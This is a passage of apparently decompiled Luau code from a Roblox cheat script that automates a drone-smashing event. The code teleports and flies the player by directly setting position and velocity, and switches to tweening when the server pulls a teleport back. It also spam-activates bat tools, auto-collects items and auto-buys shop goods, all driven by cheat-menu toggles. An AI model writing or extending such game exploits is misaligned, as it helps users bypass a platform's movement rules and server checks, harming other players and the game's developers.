							goal2 = look2 + (tbl36.Dir or Vector3.new(0, 0, 1)) * n13 + Vector3.new(0, -1, 0)
							local v22 = tbl36
							tbl36.Goal = goal2
							v22.Look = look2

							if (goal2 - position).Magnitude <= 40 then
								local n23 = math.max(deltaTime, 0.0041666666666666666)
								local n24 = vel + (goal2 - position) / math.max(0.1, n23)
								local n25 = math.max(400, vel.Magnitude + 80)

								if n25 < n24.Magnitude then
									n24 = n24.Unit * n25
								end

								local assemblyLinearVelocity = n24 + Vector3.new(0, workspace.Gravity * n23 * 0.5, 0)
								local vector3 = Vector3.new(look2.X - position.X, 0, look2.Z - position.Z)

								pcall(function()
									if vector3.Magnitude > 0.05 then
										v21.CFrame = CFrame.lookAt(position, position + vector3.Unit)
									end

									v21.AssemblyLinearVelocity = assemblyLinearVelocity
									v21.AssemblyAngularVelocity = Vector3.zero
								end)

								return
							end
						end
					end

					local vector2

					if not (Vector3.new(goal2.X - position.X, 0, goal2.Z - position.Z).Magnitude > 250) then
						vector2 = goal2
					else
						local n23 = math.max(n22, goal2.Y)
						vector2 = position.Y < n23 - 2 and Vector3.new(position.X, n23, position.Z) or Vector3.new(goal2.X, n23, goal2.Z)
					end

					local n23 = vector2 - position
					local n24 = n9 * deltaTime
					local n25 = n23.Magnitude <= n24 and vector2 or position + n23.Unit * n24
					local look2 = tbl36.Look or goal2
					local vector3 = Vector3.new(look2.X - n25.X, 0, look2.Z - n25.Z)
					local cframe = vector3.Magnitude > 0.05 and CFrame.lookAt(Vector3.zero, vector3.Unit) or v21.CFrame.Rotation

					pcall(function()
						v21.CFrame = CFrame.new(n25) * cframe
						v21.AssemblyLinearVelocity = Vector3.zero
						v21.AssemblyAngularVelocity = Vector3.zero
					end)
				end)
			end

			do
				local function fn52(arg)
					if typeof(arg) ~= "Instance" or not arg:IsA("Tool") then
						return false
					end
					local attribute = arg:GetAttribute("GearName")
					local gears = tbl.Gears
					local directory = type(gears) == "table" and gears.Directory or nil
					local flag6 = type(attribute) == "string" and type(directory) == "table" and directory[attribute] or nil
					local flag7 = type(flag6) == "table"
					local flag8

					if flag7 then
						flag8 = flag6.ToolController == "Slap" or flag6.SlapPower ~= nil
					else
						flag8 = flag7
					end

					return flag8
				end

				local function fn53(arg)
					if typeof(arg) ~= "Instance" or not arg:IsA("Tool") then
						return false
					end

					if tostring(arg:GetAttribute("ItemType")) ~= "Gear" then
						return false
					end
					local str4 = tostring(arg:GetAttribute("GearName") or "")
					if str4 == "" then
						return false
					end
					return string.find(string.lower(str4), "scrambler", 1, true) ~= nil
				end

				local function fn54()
					return localPlayer.Character, localPlayer:FindFirstChildOfClass("Backpack")
				end

				local function fn55()
					local v19 = tbl4.FindBat()
					if v19 then
						return v19
					end
					local v20, v21 = fn54()

					for _, v22 in ipairs({ v20, v21 }) do
						if v22 then
							for _, child in ipairs(v22:GetChildren()) do
								if fn52(child) or fn53(child) then
									return child
								end
							end
						end
					end

					return nil
				end

				tbl31.Valid = function(arg)
					if typeof(arg) ~= "Instance" or not arg:IsA("Tool") then
						return false
					end
					return tbl4.IsBatTool(arg) or fn52(arg) or fn53(arg)
				end

				tbl31.Owned = function(arg)
					if typeof(arg) ~= "Instance" or not arg:IsA("Tool") then
						return false
					end
					local v19, v20 = fn54()
					local parent = arg.Parent
					return parent ~= nil and (parent == v19 or parent == v20)
				end

				tbl31.Name = function(arg)
					if fn53(arg) then
						return "The Scrambler"
					end
					return tostring(arg:GetAttribute("GearName") or arg.Name)
				end

				tbl31.Put = function(arg, arg2, parent)
					local equipAt = tbl31.EquipAt
					if os.clock() - equipAt < 0.4 then
						return false
					end
					tbl31.EquipAt = os.clock()

					pcall(function()
						arg2:EquipTool(arg)
					end)

					if arg.Parent ~= parent then
						pcall(function()
							arg.Parent = parent
						end)
					end

					return arg.Parent == parent
				end

				local function fn56()
					local character = localPlayer.Character
					local humanoid = character and character:FindFirstChildWhichIsA("Humanoid")
					if not character or not humanoid or humanoid.Health <= 0 then
						return nil, false
					end
					local tool = character:FindFirstChildWhichIsA("Tool")

					if tool ~= nil and tbl31.Valid(tool) then
						tbl31.Tool = tool
						str3 = tbl31.Name(tool)
						return tool, true
					end

					if not tbl31.Owned(tbl31.Tool) then
						tbl31.Tool = fn55()
					end

					local tool2 = tbl31.Tool
					if not tool2 then
						str3 = ""
						return nil, false
					end
					str3 = tbl31.Name(tool2)
					tbl31.Put(tool2, humanoid, character)
					return tool2, tool2.Parent == character
				end

				local function fn57()
					local v19, v20 = fn56()

					if v19 and v20 then
						if flag4 then
							pcall(function()
								v19:Activate()
							end)

							task.defer(function()
								pcall(function()
									v19:Deactivate()
								end)
							end)
						else
							pcall(function()
								v19:Deactivate()
								v19:Activate()
							end)
						end
					end

					return v19 ~= nil
				end

				local function fn58()
					local v19, v20 = fn54()
					local v21 = nil
					local v22 = nil
					local v23 = nil

					for _, v24 in ipairs({ v19, v20 }) do
						if v24 then
							for _, child in ipairs(v24:GetChildren()) do
								if tbl31.Valid(child) then
									if fn53(child) then
										v21 = v21 or child
									elseif tbl4.IsBatTool(child) and (v22 == nil or not tbl4.IsBatTool(v22)) then
										if v23 then
											v22 = child
										else
											v23 = v22
											v22 = child
										end
									elseif v22 == nil then
										v22 = child
									elseif v23 == nil then
										v23 = child
									end
								end
							end
						end
					end

					return v22, v21 or v23
				end

				local function fn59(arg)
					pcall(function()
						arg:Activate()
					end)

					task.defer(function()
						pcall(function()
							arg:Deactivate()
						end)
					end)
				end

				tbl32.SpamUntil = 0
				tbl32.List = {}
				tbl32.Dirty = true
				tbl32.BuiltAt = 0
				tbl32.NextBag = 0
				tbl32.Links = {}

				tbl32.Click = function(arg)
					pcall(arg.Deactivate, arg)
					pcall(arg.Activate, arg)
				end

				tbl32.Rebuild = function()
					tbl32.Dirty = false
					tbl32.BuiltAt = os.clock()
					table.clear(tbl32.List)
					local v19, v20 = fn54()

					for _, v21 in ipairs({ v19, v20 }) do
						if v21 then
							for _, child in ipairs(v21:GetChildren()) do
								if tbl31.Valid(child) then
									tbl32.List[#tbl32.List + 1] = child
								end
							end
						end
					end
				end

				tbl32.Beat = RunService.Heartbeat:Connect(function()
					local now = os.clock()
					if now >= tbl32.SpamUntil then
						return
					end

					if tbl32.Dirty or now - tbl32.BuiltAt > 1 then
						tbl32.Rebuild()
					end

					local character = localPlayer.Character
					local flag6 = now >= tbl32.NextBag

					if flag6 then
						tbl32.NextBag = now + 0.25
					end

					for _, v19 in ipairs(tbl32.List) do
						local parent = v19.Parent

						if parent == character then
							tbl32.Click(v19)
						elseif flag6 and parent ~= nil then
							tbl32.Click(v19)
						end
					end
				end)

				tbl32.Unwatch = function()
					for i = #tbl32.Links, 1, -1 do
						pcall(function()
							tbl32.Links[i]:Disconnect()
						end)

						tbl32.Links[i] = nil
					end
				end

				tbl32.Watch = function(arg)
					tbl32.Unwatch()
					tbl32.Dirty = true
					if not arg then
						return
					end

					tbl32.Links[#tbl32.Links + 1] = arg.ChildAdded:Connect(function(child)
						if not child:IsA("Tool") then
							return
						end
						tbl32.Dirty = true
						local spamUntil = tbl32.SpamUntil

						if os.clock() < spamUntil and tbl31.Valid(child) then
							tbl32.Click(child)
							task.defer(tbl32.Click, child)
						end
					end)

					tbl32.Links[#tbl32.Links + 1] = arg.ChildRemoved:Connect(function(child)
						if child:IsA("Tool") then
							tbl32.Dirty = true
						end
					end)

					task.defer(function()
						local backpack = localPlayer:FindFirstChildOfClass("Backpack") or localPlayer:WaitForChild("Backpack", 5)

						if backpack and localPlayer.Character == arg then
							tbl32.Links[#tbl32.Links + 1] = backpack.ChildAdded:Connect(function()
								tbl32.Dirty = true
							end)

							tbl32.Links[#tbl32.Links + 1] = backpack.ChildRemoved:Connect(function()
								tbl32.Dirty = true
							end)
						end
					end)
				end

				tbl32.Watch(localPlayer.Character)
				tbl32.CharLink = localPlayer.CharacterAdded:Connect(tbl32.Watch)

				fn4(function()
					tbl32.SpamUntil = 0
					tbl32.Unwatch()

					for _, v19 in ipairs({ "Beat", "CharLink" }) do
						if tbl32[v19] then
							pcall(function()
								tbl32[v19]:Disconnect()
							end)

							tbl32[v19] = nil
						end
					end
				end)

				local function fn60()
					local character = localPlayer.Character
					local humanoid = character and character:FindFirstChildWhichIsA("Humanoid")
					if not character or not humanoid or humanoid.Health <= 0 then
						return false
					end
					local v19, v20 = fn58()
					if not v19 or not v20 then
						return fn57()
					end
					local tbl37 = { v19, v20 }
					local tbl38 = { 0.3, 0.4 }
					local v21 = tbl37[tbl32.Index]

					if tbl32.Tool ~= v21 then
						local v22 = tbl32
						local v23 = tbl32
						local now = os.clock()
						v22.Tool = v21
						v23.Since = now
					end

					local flag6 = v21.Parent == character

					if flag6 then
						local since = tbl32.Since
						flag6 = os.clock() - since >= tbl38[tbl32.Index]
					end

					if flag6 then
						tbl32.Index = tbl32.Index == 1 and 2 or 1
						v21 = tbl37[tbl32.Index]
						local v22 = tbl32
						local v23 = tbl32
						local now = os.clock()
						v22.Tool = v21
						v23.Since = now
					end

					tbl31.Tool = v21
					str3 = tbl31.Name(v21)

					if v21.Parent ~= character then
						pcall(function()
							humanoid:EquipTool(v21)
						end)

						if v21.Parent ~= character then
							pcall(function()
								v21.Parent = character
							end)
						end

						tbl32.Since = os.clock()

						if v21.Parent == character then
							fn59(v21)
							task.defer(fn59, v21)
						end

						return true
					end

					fn59(v21)
					return true
				end

				local function fn61(arg, arg2, arg3)
					local now = os.clock()
					local n23 = now + n17

					while os.clock() < n23 and not arg() do
						local v19, v20 = fn50()
						local flag6 = not v20

						if not flag6 then
							if arg2 then
								flag6 = (v20.Position - arg2).Magnitude > (arg3 or 40)
							else
								flag6 = arg2
							end
						end

						if flag6 then
							if arg2 and os.clock() - now < 1.2 then
								task.wait(0.1)
								continue
							end
							return
						end

						if fn29() and not fn29(v20.Position) then
							fn44()
							str2 = "Leaving the base through the safe zone"
							if not fn32(v20.Position + Vector3.new(0, 2.5, 0), arg, 6) then
								return
							end
							continue
						end

						str2 = v20.Kind == "Part" and "Picking up a Drone Part" or "Picking up Samples"
						fn51(v20.Position + Vector3.new(0, 2.5, 0), v20.Position)
						local n24 = os.clock() + 2.5

						while tbl29[v19] and os.clock() < n24 and not arg() do
							task.wait(0.1)
						end

						tbl29[v19] = nil
						n23 = os.clock() + 1.2
					end
				end

				local function fn62(arg, arg2)
					local now = os.clock()
					local n23 = tonumber(arg.Health) or 0
					local v19 = nil
					local v20 = nil
					local fn63 = nil
					local flag6 = false

					while not arg2() do
						local v21 = tbl28[arg.Id]
						local flag7 = not v21

						if not flag7 then
							flag7 = (tonumber(v21.Health) or 0) <= 0
						end

						if flag7 then
							return true
						end
						local v22 = fn40(arg.Id)
						if v22 and v22:GetAttribute("DroneState") == "Death" then
							tbl28[arg.Id] = nil
							return true
						end
						local v23 = fn22()
						local flag8 = v23 ~= nil and v21.Position ~= nil

						if flag8 then
							flag8 = (v23.Position - (fn42(v21) or v21.Position)).Magnitude <= 30
						end

						if flag8 and not v22 then
							local now2 = v19 or os.clock()
							if os.clock() - now2 > 1.5 then
								tbl28[arg.Id] = nil
								return false
							end
							v19 = now2
						else
							v19 = nil
						end

						local n24 = tonumber(v21.Health) or 0

						if n24 ~= n23 then
							v20 = nil
							n23 = n24
						end

						if n16 < os.clock() - now then
							tbl35[arg.Id] = os.clock() + 30
							return false
						end
						local position = fn42(v21) or v21.Position
						local v24 = fn22()
						if not v24 then
							return false
						end

						if fn29() and not fn29(position) then
							fn44()
							str2 = "Leaving the base through the safe zone"
							if not fn32(position, arg2, 12) then
								return false
							end

							if arg2() then
								return false
							end
						end

						if not fn63 then
							local v25 = nil
							local isBasePart = nil

							fn63 = function()
								local v26 = tbl28[arg.Id]
								if not v26 then
									return nil
								end

								if not v25 or not v25.Parent then
									v25 = fn40(arg.Id)
									local hitbox = v25 and v25:FindFirstChild("Hitbox")
									isBasePart = hitbox and hitbox:IsA("BasePart") and hitbox or v25 and v25.PrimaryPart or nil
								end

								if isBasePart and isBasePart.Parent then
									return isBasePart.Position
								end
								return v26.Position
							end
						end

						if flag4 then
							fn51(position + Vector3.new(0, -1, 16), position, fn63)
						else
							fn51(position + Vector3.new(0, -1, 5), position)
						end

						if (v24.Position - position).Magnitude <= 60 and not flag4 then
							fn56()
						end

						local magnitude = (v24.Position - position).Magnitude
						local flag9 = false

						if flag4 then
							flag9 = math.max(12, n13 + 7)
						end

						local flag10 = magnitude <= (flag9 or 12)

						if flag10 then
							if flag4 then
								tbl32.SpamUntil = os.clock() + 0.2
							end

							local now2 = v20 or os.clock()
							if os.clock() - now2 > 8 then
								tbl35[arg.Id] = os.clock() + 30
								return false
							end
							local flag11 = false

							if flag4 then
								flag11 = fn60()
							end

							if flag11 or not flag4 and fn57() then
								str2 = string.format("Smashing %s  %d HP", v21.Tier ~= "" and v21.Tier or "drone", math.max(0, tonumber(v21.Health) or 0))
								v20 = now2
							elseif not flag6 then
								str2 = "No bat found, get any bat to smash drones"
								flag6 = true
								v20 = now2
							else
								v20 = now2
							end
						else
							str2 = "Flying to a drone"
						end

						local wait = task.wait
						local flag11 = false

						if not flag4 then
							flag10 = flag11
						end

						wait(flag10 and 0.03 or 0.1)
					end

					return false
				end

				local function fn63(arg)
					for _, v19 in ipairs(tbl34) do
						if arg() then
							return false
						end
						str2 = "Looking for drones"
						fn51(v19)
						local n23 = os.clock() + 12

						while os.clock() < n23 and not arg() do
							fn41()
							if #fn43() > 0 then
								return true
							end

							if tbl4.DistanceTo(v19) < 8 then
								break
							end
							task.wait(0.2)
						end
					end

					return #fn43() > 0
				end

				local function fn64()
					local serverTimeNow = workspace:GetServerTimeNow()
					local v19, v20 = fn17()
					if v19 and v20 and v20 < 25 then
						return next(tbl29) ~= nil
					end

					for _, v21 in pairs(tbl29) do
						if v21.Kind == "Part" or v21.ExpiresAt and v21.ExpiresAt - serverTimeNow < 30 then
							return true
						end
					end

					return false
				end

				local v19 = nil

				local function fn65()
					local window = type(snapshot) == "table" and snapshot.Window or nil
					return type(window) == "table" and window.Index or nil
				end

				local function fn66(arg)
					local flag6 = v19 ~= nil and v19 == fn65()

					while not arg() do
						RunService.Heartbeat:Wait()

						if not arg() then
							fn41()

							if fn64() then
								fn61(arg)
							end

							local v20, flag7, flag8, v21, flag9, v22, position, flag10, magnitude, flag11, flag12, flag13, vector2, flag14, n23, v23, n24, flag15, flag16, flag17

							if fn29() then
								fn44()

								if fn31(arg) then
									v20 = fn49()
									flag7 = not v20 and next(tbl29) ~= nil

									if flag7 then
										fn61(arg)
										fn41()
										v20 = fn49()
									end

									if not v20 then
										flag8 = not fn17()
										v21 = flag8 or flag6

										if not v21 then
											v19 = fn65()
											flag9 = true
											flag6 = true

											if not fn63(arg) then
												break
											else
												continue
											end
										end
									else
										v22 = fn42(v20)
										position = v22 or v20.Position
										flag10 = fn22()
										magnitude = flag10 and (flag10.Position - position).Magnitude or 0
										flag11 = v17 == "Teleport"
										flag10 = flag11 and flag10

										if flag10 then
											flag12 = fn29() and not fn29(position)
											flag10 = not flag12
										end

										if flag10 then
											flag13 = magnitude > n15 and magnitude <= n18 and os.clock() >= n20 and os.clock() - n21 >= n19

											if flag13 then
												n21 = os.clock()
												vector2 = Vector3.new
												flag14 = false

												if flag4 then
													flag14 = 16
												end

												flag14 = flag14 or 5
												n23 = position + vector2(0, -1, flag14)
												fn51(n23, position)
												v23 = fn22()

												if v23 then
													str2 = "Teleporting to the next drone"

													pcall(function()
														v23.CFrame = CFrame.lookAt(n23, Vector3.new(position.X, n23.Y, position.Z))
														v23.AssemblyLinearVelocity = Vector3.zero
														v23.AssemblyAngularVelocity = Vector3.zero
													end)

													n24 = os.clock() + 0.8

													while true do
														flag15 = os.clock() < n24
														flag16 = flag15 and not arg()

														if flag16 then
															flag17 = fn22()
															flag17 = flag17 and (flag17.Position - n23).Magnitude > 40

															if flag17 then
																n20 = os.clock() + 30
																str2 = "Teleport pulled back, tweening"
																break
															else
																RunService.Heartbeat:Wait()
																continue
															end
														end

														break
													end
												end
											end
										end

										fn62(v20, arg)
										continue
									end
								end
							else
								v20 = fn49()
								flag7 = not v20 and next(tbl29) ~= nil

								if flag7 then
									fn61(arg)
									fn41()
									v20 = fn49()
								end

								if not v20 then
									flag8 = not fn17()
									v21 = flag8 or flag6

									if not v21 then
										v19 = fn65()
										flag9 = true
										flag6 = true

										if not fn63(arg) then
											break
										else
											continue
										end
									end
								else
									v22 = fn42(v20)
									position = v22 or v20.Position
									flag10 = fn22()
									magnitude = flag10 and (flag10.Position - position).Magnitude or 0
									flag11 = v17 == "Teleport"
									flag10 = flag11 and flag10

									if flag10 then
										flag12 = fn29() and not fn29(position)
										flag10 = not flag12
									end

									if flag10 then
										flag13 = magnitude > n15 and magnitude <= n18 and os.clock() >= n20 and os.clock() - n21 >= n19

										if flag13 then
											n21 = os.clock()
											vector2 = Vector3.new
											flag14 = false

											if flag4 then
												flag14 = 16
											end

											flag14 = flag14 or 5
											n23 = position + vector2(0, -1, flag14)
											fn51(n23, position)
											v23 = fn22()

											if v23 then
												str2 = "Teleporting to the next drone"

												pcall(function()
													v23.CFrame = CFrame.lookAt(n23, Vector3.new(position.X, n23.Y, position.Z))
													v23.AssemblyLinearVelocity = Vector3.zero
													v23.AssemblyAngularVelocity = Vector3.zero
												end)

												n24 = os.clock() + 0.8

												while true do
													flag15 = os.clock() < n24
													flag16 = flag15 and not arg()

													if flag16 then
														flag17 = fn22()
														flag17 = flag17 and (flag17.Position - n23).Magnitude > 40

														if flag17 then
															n20 = os.clock() + 30
															str2 = "Teleport pulled back, tweening"
															break
														else
															RunService.Heartbeat:Wait()
															continue
														end
													end

													break
												end
											end
										end
									end

									fn62(v20, arg)
									continue
								end
							end
						end

						break
					end

					fn61(arg)
					fn44()
				end

				local tbl37 = { LostPart1 = "Mechanical Gear", LostPart2 = "Wiring Harness" }

				tbl4.ScrambleLostPart = function(arg)
					return fn18(fn15(), arg)
				end

				v18 = nil

				fn45 = function()
					local v20 = fn15()
					if not v20 then
						return "Lost Parts: no event data"
					end
					local drScrambleEvent = workspace:FindFirstChild("DrScrambleEvent")
					local tbl38 = {}
					local n23 = 0
					local n24 = 0

					for _, v21 in ipairs(tbl25) do
						local v22 = drScrambleEvent and drScrambleEvent:FindFirstChild(v21)

						if v22 then
							n23 += 1
						end

						if fn18(v20, v21) then
							n24 += 1
						elseif v22 then
							local ok, result = pcall(v22.GetPivot, v22)
							local v23 = ok and tbl4.DistanceTo(result.Position) or nil
							tbl38[#tbl38 + 1] = v23 and string.format("%s %d studs", tbl37[v21], math.floor(v23)) or tbl37[v21]
						else
							tbl38[#tbl38 + 1] = tbl37[v21] .. " not on map"
						end
					end

					local str4 = string.format("Lost Parts on map %d/2  -  Collected %d/2", n23, n24)

					if #tbl38 > 0 then
						str4 ..= "  -  " .. table.concat(tbl38, "  -  ")
					end

					return str4
				end

				local function fn67(arg)
					if not fn28() then
						return true
					end
					local Exit = fn25("Exit")
					local v20 = fn27(Exit, nil)
					if not v20 then
						return false
					end
					str2 = "Leaving the Secret Cave"
					if not fn23(v20, arg, 4) then
						return false
					end

					for i = 1, 4 do
						if arg() then
							return false
						end
						fn24(Exit or fn25("Exit"))
						local n23 = os.clock() + 1.5

						while os.clock() < n23 and fn28() do
							RunService.Heartbeat:Wait()
						end

						if not fn28() then
							return true
						end
					end

					return not fn28()
				end

				local function fn68()
					return tbl4.IsNight() or tbl4.WallSealed()
				end

				local function fn69(arg)
					if not fn68() then
						return true
					end
					fn44()

					while fn68() and not arg() do
						str2 = tbl4.IsNight() and "Night, waiting for the wall to drop" or "Waiting for the wall to drop"
						RunService.Heartbeat:Wait()
					end

					return not arg()
				end

				fn46 = function()
					if not tbl4.Toggle(nil, false) or not fn16() then
						return false
					end

					if tbl33.Ended then
						return false
					end

					if fn17() then
						return true
					end
					fn41()
					return #fn43() > 0 or next(tbl29) ~= nil
				end

				fn47 = function()
					local v20 = fn15()
					if not v20 or v20.Completed == true or not fn16() then
						return false
					end
					local num = tonumber(v20.TotalParts)

					if not num then
						num = fn19(v20) + (tonumber(v20.DroneParts) or 0)
					end

					local flag6 = tbl4.Toggle(nil, false)

					if flag6 then
						local n23 = #tbl25
						flag6 = fn19(v20) < n23
					end

					local flag7 = tbl4.Toggle(nil, false) and (num >= 5 or v20.Discovered ~= true)
					return flag6 or flag7
				end

				fn48 = function(arg)
					local function fn70()
						return arg ~= n11 or tbl4.Movement.Owner ~= "scramble"
					end

					local function fn71()
						return fn70() or not fn46() or fn68()
					end

					while true do
						if fn46() and not fn70() then
							if fn69(fn70) then
								pcall(fn66, fn71)
								if fn68() then
									continue
								end
							end
						end

						break
					end

					fn44()
					if fn70() or fn46() then
						return
					end

					if not fn47() then
						fn33(fn70)
						str2 = ""
						return
					end

					if not fn69(fn70) then
						return
					end
					fn14(true)
					local v20 = fn15()
					if not v20 then
						return
					end

					if not fn47() then
						str2 = ""
						return
					end

					if tbl4.Toggle(nil, false) and v20.Discovered ~= true then
						pcall(fn34, fn70)
					end

					if tbl4.Toggle(nil, false) then
						pcall(fn35, function()
							return fn70() or not tbl4.Toggle(nil, false) or fn46() or fn68()
						end)
					end

					if tbl4.Toggle(nil, false) then
						pcall(fn36, function()
							return fn70() or not tbl4.Toggle(nil, false) or fn46() or fn68()
						end)
					end

					if fn28() and not fn70() then
						pcall(fn67, fn70)
					end

					if not fn28() and not fn46() then
						pcall(fn33, fn70)
					end
				end
			end
		end

		local fn49

		fn49 = function(arg)
			if not (tbl4.Treadmill.Riding or tbl4.OnBelt()) then
				return true
			end

			for i = 1, 3 do
				if arg() then
					return false
				end
				str2 = "Jumping off the treadmill"
				tbl4.Treadmill.Riding = false
				task.spawn(tbl4.LeaveBelt)
				local character = localPlayer.Character
				local humanoid = character and character:FindFirstChildOfClass("Humanoid")

				if humanoid then
					pcall(function()
						humanoid.Sit = false
						humanoid.Jump = true
						humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
					end)
				end

				local v19 = fn22()

				if v19 then
					local position = v19.Position
					local n22 = position + Vector3.new(0, 18, 0)
					local now = os.clock()

					while true do
						RunService.Heartbeat:Wait()
						local v20 = fn22()

						if not v20 then
							break
						else
							local n23 = math.min(1, (os.clock() - now) / 0.25)

							pcall(function()
								local rotation = v20.CFrame.Rotation
								v20.CFrame = CFrame.new(position:Lerp(n22, n23)) * rotation
								v20.AssemblyLinearVelocity = Vector3.zero
								v20.AssemblyAngularVelocity = Vector3.zero
							end)

							if not (n23 >= 1) then
								continue
							end
							break
						end
					end
				end

				if not (tbl4.Treadmill.Riding or tbl4.OnBelt()) then
					return true
				end
			end

			return not tbl4.OnBelt()
		end

		tbl30.Handle = v7:CreateToggle({
			Name = "Auto Buy Scramble Shop",
			Note = "Buy the picked items with Samples",
			Default = false,
			Callback = function()
				n14 = 0
				tbl3.Wake()
			end,
		})

		fn6(v7:CreateMultiDropdown({
			Name = "Scramble Shop Items",
			Options = tbl27,
			Default = { "Scrambled Mutation" },
			SubOf = tbl30.Handle,
			Callback = function(arg)
				local picked = {}

				if type(arg) == "table" then
					for k, v19 in pairs(arg) do
						if v19 == true and type(k) == "string" then
							picked[k] = true
						elseif type(v19) == "string" then
							picked[v19] = true
						end
					end
				end

				tbl30.Picked = picked
			end,
		}))

		v7:CreateSlider({
			Name = "Keep Samples",
			Note = "Never spend below this many Samples",
			Min = 0,
			Max = 10000,
			Default = 0,
			Increment = 25,
			Unit = "",
			SubOf = tbl30.Handle,
			Callback = function(arg)
				tbl30.Keep = math.max(0, tonumber(arg) or 0)
			end,
		})

		local tbl36
		tbl36 = { "Highest Value", "Best Rarity", "Biggest Size" }
		local tbl37

		do
			local tbl38 = { idle = "#8C93A6", work = "#FFC857", good = "#57E08A", stop = "#FF6B6B" }
			local n22 = 6

			tbl37 = {
				Handle = nil,
				BuyHandle = nil,
				Loop = 0,
				MinRarity = 0,
				MinIncome = 0,
				Priority = tbl36[1],
				SkipMutated = true,
				Targets = {},
				Cooldown = 0,
				Status = "Idle",
				State = "idle",
				Detail = "Turn it on to start applying Scrambled",
				RarityColor = "#FFFFFF",
				Icon = "",
				Ui = {},
				Row = nil,
				Left = 0,
				Pen = 0,
				Match = 0,
				Tries = 0,
				Hits = 0,
				Locked = nil,
				Short = false,
				EggOptions = {},
				EggCategory = {},
			}

			local directory = tbl.Assets and tbl.Assets.Directory
			local tbl39 = {}

			if type(directory) == "table" then
				for k, v19 in pairs(directory) do
					local rarity = type(v19) == "table" and v19.Rarity or nil
					local flag6 = type(rarity) == "table"

					if flag6 then
						flag6 = tonumber(rarity.RarityNumber or rarity.Rank)
					end

					flag6 = flag6 or nil

					if flag6 then
						table.insert(tbl39, {
							Category = tostring(k),
							Name = tostring(v19.DisplayName or k),
							Rarity = flag6,
							RarityName = tostring(rarity.DisplayName or rarity._id or flag6),
						})
					end
				end
			end

			table.sort(tbl39, function(arg, arg2)
				if arg.Rarity ~= arg2.Rarity then
					return arg.Rarity > arg2.Rarity
				end
				return arg.Name < arg2.Name
			end)

			for _, v19 in ipairs(tbl39) do
				local str4 = string.format("%s [%s]", v19.Name, v19.RarityName)

				if tbl37.EggCategory[str4] then
					str4 = string.format("%s [%s] (%s)", v19.Name, v19.RarityName, v19.Category)
				end

				table.insert(tbl37.EggOptions, str4)
				tbl37.EggCategory[str4] = v19.Category
			end

			local function fn50(arg)
				local directory2 = tbl.Assets and tbl.Assets.Directory
				return type(directory2) == "table" and directory2[tostring(arg)] or nil
			end

			local function fn51(arg)
				local v19 = fn50(arg.AssetCategory)
				local rarity = type(v19) == "table" and v19.Rarity or nil
				local flag6 = type(rarity) == "table"

				if flag6 then
					flag6 = tonumber(rarity.RarityNumber or rarity.Rank)
				end

				return flag6 or 0
			end

			local function fn52(arg)
				local v19 = fn50(arg.AssetCategory)
				local n23 = type(v19) == "table" and tonumber(v19.EarningRate) or 0
				local n24 = tonumber(arg.AssetScale) or 0
				if n23 <= 0 or n24 <= 0 then
					return 0
				end
				return n23 * (n24 > 5 and (n24 / 5) ^ 1.2 * 19.637875755794113 or n24 ^ 1.85)
			end

			local function fn53(arg)
				if tostring(arg.BaseMutation or "") == "Scrambled" then
					return true
				end

				if type(arg.Mutations) == "table" then
					for k, mutation in pairs(arg.Mutations) do
						if type(mutation) == "string" and mutation == "Scrambled" then
							return true
						end

						if type(k) == "string" and k == "Scrambled" and mutation ~= false then
							return true
						end
					end
				end

				return false
			end

			local function fn54()
				local eggState = tbl.EggState
				if type(eggState) ~= "table" or type(eggState.ReadOwnerEggs) ~= "function" then
					return {}
				end
				local ok, result = pcall(eggState.ReadOwnerEggs, localPlayer.UserId)
				if not ok or type(result) ~= "table" then
					return {}
				end
				local tbl40 = {}

				for k, v19 in pairs(result) do
					if type(v19) == "table" and v19.Placement ~= nil then
						v19.Uid = v19.Uid or k
						tbl40[#tbl40 + 1] = v19
					end
				end

				return tbl40
			end

			local function fn55(arg)
				arg = arg and arg.Uid

				if arg then
					local areaEggSlotsClient = workspace:FindFirstChild("AreaEggSlotsClient")
					local v19 = areaEggSlotsClient and areaEggSlotsClient:FindFirstChild(arg)

					if v19 then
						local ok, result = pcall(function()
							return v19:GetPivot().Position
						end)

						if ok and typeof(result) == "Vector3" then
							return result
						end
					end
				end

				if type(tbl4.PenAnchor) == "function" then
					local ok, result = pcall(tbl4.PenAnchor)
					if ok and typeof(result) == "Vector3" then
						return result
					end
				end

				return nil
			end

			local function fn56(arg, arg2)
				local v19 = fn55(arg)
				if v19 == nil then
					return true
				end

				if tbl4.DistanceTo(v19) <= n22 then
					return true
				end

				local function fn57()
					if arg2 ~= tbl37.Loop or not tbl4.Toggle(tbl37.Handle, false) then
						return true
					end

					if tbl4.Movement.PlaceWanted == true then
						return true
					end
					return tbl4.Movement.ScrambleWanted == true or tbl4.Steal.Wanted == true
				end

				if tbl4.Treadmill.Riding or tbl4.OnBelt() then
					tbl4.ExitBelt()
				end

				tbl4.HoldBelt()
				local ok, result = pcall(tbl4.FlyTo, v19 + Vector3.new(0, 3, 0), fn57, "mutation")
				tbl4.ReleaseBelt()
				tbl4.LeaveBelt()
				result = ok and result
				local flag6

				if result then
					local n23 = n22 + 4
					flag6 = tbl4.DistanceTo(v19) <= n23
				else
					flag6 = result
				end

				return flag6
			end

			local v19 = fn37

			local function fn57(arg)
				if not arg then
					return 0
				end
				local num = tonumber(arg:GetAttribute("Uses"))
				if num ~= nil then
					return num
				end
				local v20 = string.match(arg.Name, "%[X(%d+)%]")
				return tonumber(v20) or 1
			end

			local function fn58()
				local v20 = v19()
				if not v20 then
					return nil, 0
				end
				local v21 = fn57(v20)
				if v21 <= 0 then
					return nil, 0
				end
				return v20, v21
			end

			tbl37.Grip = function(arg)
				local character = localPlayer.Character
				local humanoid = character and character:FindFirstChildOfClass("Humanoid")
				if not character or not humanoid or not arg or arg.Parent == nil then
					return false
				end

				if arg.Parent ~= character then
					pcall(function()
						humanoid:EquipTool(arg)
					end)

					if arg.Parent ~= character then
						pcall(function()
							arg.Parent = character
						end)
					end

					task.wait(0.2)
				end

				return arg.Parent == character
			end

			local function fn59()
				if not tbl4.Toggle(tbl37.BuyHandle, false) or flag5 then
					return false
				end
				flag5 = true
				local flag6 = false

				local ok, result = pcall(function()
					flag6 = tbl37.Purchase()
				end)

				flag5 = false

				if not ok then
					tbl37.Status = "Buy failed: " .. tostring(result)
				end

				return flag6
			end

			tbl37.Purchase = function()
				local n23 = 0
				local short = false

				for i = 1, 10 do
					local flag6 = n23 == 0 and fn14(true) or snapshot
					local v20 = fn15()

					if not (type(flag6) ~= "table" or type(v20) ~= "table") then
						local v21, v22, v23 = ipairs(type(flag6.Shop) == "table" and flag6.Shop or {})
						local v24 = nil

